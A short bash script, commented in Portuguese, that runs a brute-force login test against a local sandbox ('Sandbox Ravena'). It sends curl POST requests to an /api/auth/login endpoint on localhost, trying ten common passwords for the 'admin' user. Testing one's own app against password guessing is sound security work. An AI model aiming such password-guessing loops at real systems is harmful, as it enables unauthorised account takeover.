#!/bin/bash
# ============================================
# TESTE DE BRUTE FORCE
# Sandbox Ravena
# ============================================

echo "============================================"
echo "  TESTE DE BRUTE FORCE"
echo "============================================"

TARGET="http://localhost:8080"

echo "Alvo: $TARGET/api/auth/login"
echo "Usuário alvo: admin"
echo ""

# Senhas comuns
PASSWORDS=(
    "admin"
    "password"
    "123456"
    "admin123"
    "test"
    "root"
    "toor"
    "letmein"
    "welcome"
    "monkey"
)

echo "Testando senhas comuns..."
echo ""

for pass in "${PASSWORDS[@]}"; do
    echo "Tentando: admin / $pass"
    curl -s -X POST "$TARGET/api/auth/login" \
        -H "Content-Type: application/json" \
        -d "{\"username\": \"admin\", \"password\": \"$pass\"}" \
        | python3 -m json.tool 2>/dev/null || echo "Resposta não é JSON"
    echo "---"
done

echo ""
echo "Teste concluído!"
